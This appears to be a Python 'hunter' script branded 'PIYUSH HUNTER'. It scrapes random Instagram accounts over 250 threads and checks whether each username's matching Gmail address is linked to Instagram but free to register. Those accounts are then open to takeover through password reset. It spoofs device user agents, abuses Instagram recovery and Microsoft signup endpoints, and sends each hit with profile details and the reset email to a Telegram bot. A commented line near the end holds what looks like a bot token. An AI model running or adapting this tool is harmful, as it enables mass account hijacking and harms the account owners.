#import datetime
#an = datetime.datetime.now()
#an2 = datetime.datetime(2024, 11, 11, 0, 00, 00)#Control the time
#if an > an2 or an == an2:
       #exit(" Your subscription has ended, my dear. Contact the developer to activate it.)
#import datetime
print(('—'*30)+'\n• DєCσDє Bу  - @thethestar •\n'+('—'*30))       
import requests
import os
import uuid
from threading import Thread
import random
import  webbrowser
import string
import json
from random import randrange
import hashlib
import sys
from user_agent import generate_user_agent
import re

try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    exit(print('restart tool'))

def ggm():
  while True:
    yield generate_user_agent(device_type="smartphone")

mba = ggm()

def uu():
    sttt = str(uuid.uuid4())
    tstt = str(uuid.uuid4()).replace('-', '')
    return sttt, tstt

sttt, tstt = uu()

badig = 0
badhot = 0
goodig = 0
hits = 0
aca = 0

P = '\x1b[1;97m'
c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
x = '\x1b[1;33m'
z = '\x1b[1;31m'
YY = "\033[1;33m"
B = '\x1b[2;36m'
kk = f'\x1b[38;5;117m'

WDEH = render('PIYUSH HUNTER', colors=['cyan', 'red'], align='center')
print(f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97m • DєCσDє Bу - @thethestar •    : \033[1;96m
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : \033[1;96m
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTOOL   : \033[1;96m  HIT BY PIYUSH 🥰
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")

import webbrowser
import getpass
import os,requests,sys,time,datetime
import requests,re,random,os,sys
from rich import print as g
from rich.panel import Panel
from threading import Thread
R = '\033[1;31;40m'  # Red
X = '\033[1;33;40m'  # Yellow
F = '\033[1;32;40m'  # Green
C = "\033[1;97;40m"  # White
B = '\033[1;36;40m'  # Blue
K = '\033[1;35;40m'  # Purple
V = '\033[1;36;40m'  # Cyan
nnn = random.choice([R,X,F,B,K,V])
good_hot,bad_hot,good_ig,bad_ig,check,mj,ids=0,0,0,0,0,0,[]
tok = input('• {}TOKEN : {}'.format(B,C))
print("\r")
iD = input('• {}ID : {}'.format(B,C))
os.system('clear')

# ==========================
# FILE SAVING FUNCTION - ADDED
# ==========================
def save_to_file(hunt_data, filename="hits.txt"):
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(hunt_data + "\n")
            f.write("="*50 + "\n\n")
        print(f"✅ Hit saved to {filename}")
    except Exception as e:
        print(f"Error saving to file: {e}")

# ==========================
# PIYUSH'S WORKING INSTAGRAM METHODS
# ==========================
def get_instagram_data_piyush(username):
    """Piyush's working Instagram data extraction"""
    methods = [
        method_piyush_graphql,      # Main GraphQL method
        method_instagram_public,    # Public API
        method_instagram_web        # Web scraping
    ]
    
    for method in methods:
        try:
            account_info = method(username)
            if account_info and account_info.get('follower_count', 0) > 0:
                print(f"✅ Success with {method.__name__} for {username}")
                return account_info
        except Exception as e:
            continue
    
    # Return empty but honest data
    return {
        'full_name': username,
        'follower_count': 'N/A',
        'following_count': 'N/A',
        'media_count': 'N/A',
        'pk': 'N/A',
        'biography': 'Data not available',
        'is_verified': False,
        'is_private': False,
        'is_business': False
    }

def method_piyush_graphql(username):
    """Piyush's main GraphQL method - MOST RELIABLE"""
    try:
        # Generate random session data
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        user_agent = "Instagram 219.0.0.12.117 Android"
        
        headers = {
            'User-Agent': user_agent,
            'X-FB-LSD': lsd,
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-IG-App-ID': '936619743392459'
        }
        
        # Use working document IDs from Piyush script
        doc_ids = [
            '7660155666921421',  # User profile query
            '7717269488336001',  # User hover card
            '25618261841150840'  # Profile data
        ]
        
        for doc_id in doc_ids:
            try:
                data = {
                    'lsd': lsd,
                    'variables': json.dumps({"username": username}),
                    'doc_id': doc_id
                }
                
                response = requests.post(
                    'https://www.instagram.com/api/graphql',
                    headers=headers,
                    data=data,
                    timeout=10
                )
                
                if response.status_code == 200:
                    json_data = response.json()
                    user_data = json_data.get('data', {}).get('user', {})
                    
                    if user_data:
                        return {
                            'full_name': user_data.get('full_name', username),
                            'follower_count': user_data.get('edge_followed_by', {}).get('count', 
                                        user_data.get('follower_count', 0)),
                            'following_count': user_data.get('edge_follow', {}).get('count',
                                        user_data.get('following_count', 0)),
                            'media_count': user_data.get('edge_owner_to_timeline_media', {}).get('count',
                                        user_data.get('media_count', 0)),
                            'pk': user_data.get('id', 'N/A'),
                            'biography': user_data.get('biography', ''),
                            'is_verified': user_data.get('is_verified', False),
                            'is_private': user_data.get('is_private', False),
                            'is_business': user_data.get('is_business', False)
                        }
            except:
                continue
                
    except Exception as e:
        pass
        
    return None

def method_instagram_public(username):
    """Public Instagram API method"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        }
        
        response = requests.get(
            f'https://www.instagram.com/{username}/?__a=1&__d=dis',
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            user = data.get('graphql', {}).get('user', {})
            
            return {
                'full_name': user.get('full_name', username),
                'follower_count': user.get('edge_followed_by', {}).get('count', 0),
                'following_count': user.get('edge_follow', {}).get('count', 0),
                'media_count': user.get('edge_owner_to_timeline_media', {}).get('count', 0),
                'pk': user.get('id', 'N/A'),
                'biography': user.get('biography', ''),
                'is_verified': user.get('is_verified', False),
                'is_private': user.get('is_private', False),
                'is_business': user.get('is_business', False)
            }
    except:
        pass
        
    return None

def method_instagram_web(username):
    """Web scraping fallback"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        response = requests.get(
            f'https://www.instagram.com/{username}/',
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            # Extract from meta tags
            html = response.text
            import re
            
            # Look for JSON data
            pattern = r'window\._sharedData\s*=\s*({.+?});'
            match = re.search(pattern, html)
            
            if match:
                data = json.loads(match.group(1))
                user = data['entry_data']['ProfilePage'][0]['graphql']['user']
                
                return {
                    'full_name': user.get('full_name', username),
                    'follower_count': user['edge_followed_by']['count'],
                    'following_count': user['edge_follow']['count'],
                    'media_count': user['edge_owner_to_timeline_media']['count'],
                    'pk': user['id'],
                    'biography': user.get('biography', ''),
                    'is_verified': user['is_verified'],
                    'is_private': user['is_private'],
                    'is_business': user.get('is_business', False)
                }
    except:
        pass
        
    return None

def cookie(email):
    versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
    oss = [
    "Macintosh; Intel Mac OS X 10_15_7",
     "Macintosh; Intel Mac OS X 10_14_6",
      "iPhone; CPU iPhone OS 14_0 like Mac OS X",
       "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
    version = random.choice(versions)
    platform = random.choice(oss)
    user_agent = f"Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/605.1.15"
    try:
        url = 'https://signup.live.com'
        headers={'user-agent': user_agent}
        response = requests.post(url,headers=headers)
        amsc = response.cookies.get_dict()['amsc']
        match = re.search(r'"apiCanary":"(.*?)"', response.text)
        if match:
            api_canary= match.group(1)
            canary = api_canary.encode().decode('unicode_escape')
        else:pass
        return amsc,canary
    except :
        check_hot(email)

def insta1(email):
	global good_ig,bad_ig
	try:
		app=''.join(random.choice('1234567890')for i in range(15))
		response = requests.get('https://www.instagram.com/api/graphql')
		csrf = response.cookies.get_dict().get('csrftoken')
		rnd=str(random.randint(150, 999))
		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
		common_data = {'flow': 'fxcal','recaptcha_challenge_field': '',}
		data = {'email_or_username': email + "@gmail.com", **common_data}
		headers = {'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','user-agent': user_agent,'viewport-width': '384','x-asbd-id': '129477','x-csrftoken': f'{csrf}','x-ig-app-id': app,'x-ig-www-claim': '0','x-instagram-ajax': '1007832499','x-requested-with': 'XMLHttpRequest'}
		response = requests.post('https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/', headers=headers, data=data)
		if 'email_or_sms_sen' in response.text :
			good_ig+=1			
			check_hot(email)
		else:
			bad_ig+=1			
	except requests.exceptions.ConnectionError:
		insta1(email)

def insta2(email):
	bb =0
	global good_ig,bad_ig
	try:
		rnd=str(random.randint(150, 999))
		user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
		url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
		head= {	
			 'Host': 'www.instagram.com',
			 'origin': 'https://www.instagram.com',
			 'referer': 'https://www.instagram.com/accounts/signup/email/',	
			 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
			 'user-agent': user_agent}
		data = {
		'email':email+"@gmail.com"
		}
		res= requests.post(url,headers=head,data=data)
		if 'email_is_taken' in res.text:		
			good_ig+=1			
			check_hot(email)
		else:
			bad_ig+=1			
	except requests.exceptions.ConnectionError:
		insta2(email)

def check_hot(email):
	global good_hot,bad_hot
	versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
	oss = [
	"Macintosh; Intel Mac OS X 10_15_7",
	 "Macintosh; Intel Mac OS X 10_14_6",
	 "iPhone; CPU iPhone OS 14_0 like Mac OS X",
	  "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
	version = random.choice(versions)
	platform = random.choice(oss)
	user_agent = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
	try:	     
	     amsc,canary = cookie(email)	     
	     headers = {
      'authority': 'signup.live.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': canary,
      'user-agent': user_agent,
    }
	     cookies = {
      'amsc':amsc
    }
	     data = {
      'signInName': email+"@gmail.com",
    }
	     response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',cookies=cookies,headers=headers,json=data)   
	     if 'isAvailable' in response.text:
	     	good_hot+=1	     	
	     	hunting(email)	     	
	     else:	     	
	     	pass  	
	except requests.exceptions.ConnectionError:
		check_hot(email)	

def date_sc(Id):
 try:
  if int(Id) >1 and int(Id)<1279000:
   return 2010
  elif int(Id)>1279001 and int(Id)<17750000:
   return 2011
  elif int(Id) > 17750001 and int(Id)<279760000:
   return 2012
  elif int(Id)>279760001 and int(Id)<900990000:
   return 2013
  elif int(Id)>900990001 and int(Id)< 1629010000:
   return 2014
  elif int(Id)>1900000000 and int(Id)<2500000000:
   return 2015
  elif int(Id)>2500000000 and int(Id)<3713668786:
   return 2016
  elif int(Id)>3713668786 and int(Id)<5699785217:
   return 2017
  elif int(Id)>5699785217 and int(Id)<8507940634:
   return 2018
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 2019
  else:
   return "2020-2023"
 except:
  return "2020-2023"
	
def hunting(email):	
	try:
		headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
		data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+email+'"}',
    'ig_sig_key_version': '4',
}	
		try:
		    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
		    rest = response.json()['email']
		except :
			rest = "Available"
		
		# USE PIYUSH'S WORKING METHOD
		account_info = get_instagram_data_piyush(email)
		
		full_name = account_info['full_name']
		followers = account_info['follower_count']
		following = account_info['following_count']
		post = account_info['media_count']
		user_id = account_info['pk']
		bio = account_info['biography']
		is_verified = account_info['is_verified']
		is_private = account_info['is_private']
		is_business = account_info['is_business']
		
		try:
			date = date_sc(int(user_id)) if user_id.isdigit() else "2020-2023"
		except:
			date = "2020-2023"
			
		# Instagram profile URL
		profile_url = f"https://instagram.com/{email}"
		
		# PERFECT HIT FORMAT WITH REAL DATA
		hunt = ("""
¸¸.•´¯•.¸ @thethestar ¸.•´¯•.¸¸
     ✅ Username: {}
     ✅ Full Name: {}
     ✅ Email: {}@gmail.com
     ✅ Followers: {}
     ✅ Following: {}
     ✅ Posts: {}
     ✅ User ID: {}
     ✅ Verified: {}
     ✅ Private: {}
     ✅ Business: {}
     ✅ Bio: {}
     ✅ Created: {}
     ✅ Reset: {}
     ✅ Profile: {}
     ✅ Tool: PIYUSH HUNTER 🎯
¸¸.•´¯•.¸ @thethestar ¸.•´¯•.¸¸
		""".format(email, full_name, email, followers, following, post, user_id, 
		          "✅" if is_verified else "❌", 
		          "✅" if is_private else "❌",
		          "✅" if is_business else "❌",
		          bio[:50] + "..." if len(bio) > 50 else bio,
		          date, rest, profile_url))
		
		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
		
		# ✅ ADDED: SAVE HIT TO FILE
		save_to_file(hunt)
		
		# TERMINAL DISPLAY
		hunt2 = ("""
¸¸.•´¯•.¸ @thethestar ¸.•´¯•.¸¸
     ✅ Username: {}
     ✅ Full Name: {}
     ✅ Email: {}@gmail.com
     ✅ Followers: {}
     ✅ Following: {}
     ✅ Posts: {}
     ✅ Profile: {}
     ✅ Tool: PIYUSH HUNTER 🎯
¸¸.•´¯•.¸ @thethestar ¸.•´¯•.¸¸
		""".format(email, full_name, email, followers, following, post, profile_url))
		Hit = Panel(hunt2)
		g(Panel(Hit, title=f"Instagram Hit | {good_hot}"))
		
	except Exception as e:
		print(f"Error in hunting: {e}")
		hunting(email)

def check_email(email):
	global good_hot,bad_hot,bad_ig,good_ig,check
	Choice = random.choice(['insta1','insta2'])
	if Choice != 'insta2':
		insta1(email)
	else :
		insta2(email)
	b = random.randint(5,208)
	bo = f'\x1b[38;5;{b}m'
	check+=1
	

	sys.stdout.write(f"\r   {bo}[ {C}PIYUSH {bo}] {C}Hit : {F}{good_hot}  {C}Wrong : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo} Checked •{check}\r")
	sys.stdout.flush()

def rand_ids():  
  Id= str(random.randrange(128053904,438909537))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
    rand_ids()
    
def username1():
  global check
  try:
    while True:      
      rnd=str(random.randint(150, 999))
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids()
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
      headers = {
    'accept': '*/*',
    'accept-language': 'en,en-US;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/cristiano/following/',
    'user-agent': user_agent,
    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
    'x-fb-lsd': lsd,
}
      data = {
    'lsd': lsd,
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
    'server_timestamps': 'true',
    'doc_id': '7717269488336001',
}
      response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
      user =response.json()['data']['user']['username'] 
      check_email(user)           
  except :
  	username1()

for i in range(250):
  Thread(target=username1).start()
  #8494405705:AAGik61a6DqMObHbeQ1VH-LCIHt5Ad__T38
  #7151732283
  
